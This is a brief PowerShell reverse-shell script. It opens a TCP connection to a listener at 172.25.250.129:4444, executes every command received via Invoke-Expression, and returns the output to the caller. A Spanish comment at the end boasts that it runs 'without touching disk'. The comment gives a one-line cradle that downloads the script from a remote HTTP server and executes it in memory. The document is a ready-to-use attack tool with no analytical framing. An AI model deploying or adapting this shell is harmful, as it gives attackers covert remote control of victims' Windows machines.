$LHOST = "172.25.250.129";
$LPORT = 4444

try {
	$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT);
} catch {
	if($client -eq $null) {
		exit 1;
	}
}

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
};
$client.Close()

<#
Ejecutar desde sistema remoto (Windows). El reverse shell es ejecutado SIN tocar disco :)
------------------------------------------------------------------------------------------
PS1> powershell.exe "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.33:8000/reverseshell.ps1')"
#>

